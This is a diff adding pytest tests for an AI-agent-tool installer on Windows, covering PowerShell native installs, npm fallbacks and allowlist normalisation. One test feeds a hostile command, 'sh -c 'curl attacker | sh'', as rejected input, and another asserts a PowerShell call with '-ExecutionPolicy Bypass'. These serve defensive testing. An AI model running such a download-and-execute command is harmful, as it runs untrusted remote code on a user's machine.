@@ -4,6 +4,7 @@ import subprocess
 import threading
 import urllib.error
 from datetime import UTC, datetime
+from types import SimpleNamespace
 
 import pytest
 from fastapi.testclient import TestClient
@@ -215,6 +216,82 @@ def test_missing_agent_tools_offer_official_and_china_install_sources(monkeypatc
         assert all("npm config" not in str(item["command"]) for item in options)
 
 
+def test_windows_install_options_work_without_system_npm(monkeypatch) -> None:
+    spec = agent_tools.agent_tool_spec("codex")
+    assert spec is not None
+    monkeypatch.setattr(
+        agent_tools.shutil,
+        "which",
+        lambda command, path=None: (
+            "C:/Windows/System32/powershell.exe" if command == "powershell.exe" else None
+        ),
+    )
+
+    options = agent_tools.install_options_payload(spec, platform_name="windows")
+    by_id = {item["id"]: item for item in options}
+
+    assert by_id["official-native"]["command"].startswith("powershell ")
+    assert by_id["official-native"]["available"] is True
+    assert by_id["official-native"]["recommended"] is True
+    assert by_id["official-native"]["native_binary"] is False
+    assert by_id["official-npm"]["available"] is False
+    assert by_id["official-npm"]["recommended"] is False
+    assert by_id["official-npm"]["missing_requirements"] == ["npm"]
+    assert by_id["npmmirror"]["available"] is False
+    assert by_id["npmmirror"]["missing_requirements"] == ["npm"]
+
+    opencode = agent_tools.agent_tool_spec("opencode")
+    assert opencode is not None
+    opencode_options = {
+        item["id"]: item
+        for item in agent_tools.install_options_payload(
+            opencode,
+            platform_name="windows",
+        )
+    }
+    assert opencode_options["official-native"]["available"] is True
+    assert opencode_options["official-native"]["recommended"] is True
+    assert opencode_options["official-native"]["native_binary"] is True
+    assert opencode_options["official-native"]["command"] == ""
+    assert opencode_options["official-npm"]["available"] is False
+
+
+def test_remote_windows_install_options_keep_the_node_platform() -> None:
+    normalized = agent_tools.normalize_agent_tools_payload(
+        {
+            "supported": True,
+            "installs_supported": True,
+            "platform": "windows",
+            "tools": [
+                {
+                    "name": "codex",
+                    "status": "missing",
+                    "install_options": [
+                        {
+                            "id": "official-native",
+                            "available": True,
+                            "missing_requirements": [],
+                        },
+                        {
+                            "id": "official-npm",
+                            "available": False,
+                            "missing_requirements": ["npm"],
+                        },
+                    ],
+                }
+            ],
+        }
+    )
+
+    assert normalized["platform"] == "windows"
+    codex = tool_by_name(normalized, "codex")
+    by_id = {item["id"]: item for item in codex["install_options"]}
+    assert by_id["official-native"]["command"].startswith("powershell ")
+    assert by_id["official-native"]["recommended"] is True
+    assert by_id["official-npm"]["available"] is False
+    assert by_id["official-npm"]["missing_requirements"] == ["npm"]
+
+
 def test_remote_install_options_are_rebuilt_from_the_local_allowlist() -> None:
     normalized = agent_tools.normalize_agent_tools_payload(
         {
@@ -294,6 +371,27 @@ def test_agent_tool_install_runs_only_the_selected_allowlisted_option(monkeypatc
     assert result["after_version"] == "codex-cli 2.0.0"
 
 
+def test_windows_npm_fallback_reports_a_missing_npm_without_spawning(monkeypatch) -> None:
+    monkeypatch.setattr(agent_tools, "current_install_platform", lambda: "windows")
+    monkeypatch.setattr(
+        agent_tools,
+        "probe_agent_tool",
+        lambda _spec: {"status": "missing", "version": ""},
+    )
+    monkeypatch.setattr(agent_tools.shutil, "which", lambda command, path=None: None)
+    monkeypatch.setattr(
+        agent_tools,
+        "run_agent_install_option",
+        lambda _option: pytest.fail("an unavailable npm fallback must not be spawned"),
+    )
+
+    result = agent_tools.install_agent_tool("codex", "npmmirror")
+
+    assert result["ok"] is False
+    assert result["platform"] == "windows"
+    assert result["error"] == "Required command not found: npm"
+
+
 def test_agent_tool_install_rejects_an_option_outside_the_allowlist() -> None:
     with pytest.raises(ValueError, match="Unsupported install option"):
         agent_tools.install_agent_tool("codex", "sh -c 'curl attacker | sh'")
@@ -324,6 +422,55 @@ def test_native_install_downloads_to_a_file_and_does_not_use_a_shell(monkeypatch
     assert calls[0][0][0] == "bash"
     assert calls[0][1] == agent_tools.AGENT_TOOL_INSTALL_TIMEOUT_SECONDS
     assert calls[0][2] == b"#!/bin/sh\necho installed\n"
+
+
+def test_windows_native_install_runs_downloaded_powershell_file(monkeypatch) -> None:
+    spec = agent_tools.agent_tool_spec("codex")
+    assert spec is not None
+    option = agent_tools.agent_install_option(
+        spec,
+        "official-native",
+        platform_name="windows",
+    )
+    calls: list[list[str]] = []
+    monkeypatch.setattr(agent_tools, "download_install_script", lambda _url: b"Write-Host ok\n")
+
+    def fake_run(argv, *, timeout):  # type: ignore[no-untyped-def]
+        calls.append(list(argv))
+        assert timeout == agent_tools.AGENT_TOOL_INSTALL_TIMEOUT_SECONDS
+        assert agent_tools.Path(argv[-1]).read_bytes() == b"Write-Host ok\n"
+        return 0, "installed"
+
+    monkeypatch.setattr(agent_tools, "run_agent_command", fake_run)
+
+    assert agent_tools.run_agent_install_option(option) == (0, "installed")
+    assert calls[0][:-1] == [
+        "powershell.exe",
+        "-NoProfile",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-File",
+    ]
+
+
+def test_windows_opencode_install_uses_the_verified_native_release(monkeypatch) -> None:
+    spec = agent_tools.agent_tool_spec("opencode")
+    assert spec is not None
+    option = agent_tools.agent_install_option(
+        spec,
+        "official-native",
+        platform_name="windows",
+    )
+    monkeypatch.setattr(
+        agent_tools,
+        "install_opencode_windows",
+        lambda: SimpleNamespace(version="v1.2.3"),
+    )
+
+    returncode, output = agent_tools.run_agent_install_option(option)
+
+    assert returncode == 0
+    assert output == "Installed OpenCode v1.2.3 from its verified official Windows release."
 
 
 def test_normalized_agent_install_result_rejects_untrusted_commands() -> None:
